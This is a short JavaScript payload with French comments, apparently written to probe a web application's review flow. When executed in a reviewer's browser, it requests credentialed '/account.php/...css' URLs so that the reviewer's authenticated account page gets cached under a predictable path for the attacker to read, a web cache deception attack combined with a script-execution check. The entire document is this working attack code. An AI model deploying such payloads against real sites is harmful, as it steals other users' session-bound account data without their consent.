(function(){
  // TEST: si ce JS s'exécute, le reviewer fetch /account.php/EXECUTED_31337.css
  // -> sera mis en cache (cache deception) -> on le lira
  var t = new Date().getTime();
  try { fetch('/account.php/EXECUTED_' + t + '.css', {credentials:'include'}); } catch(e) {}
  try { var img = new Image(); img.src = '/account.php/EXECUTED_IMG_' + t + '.css'; } catch(e) {}
  // marqueur fixe pour vérification facile
  try { fetch('/account.php/EXECUTED_31337.css', {credentials:'include'}); } catch(e) {}
})();
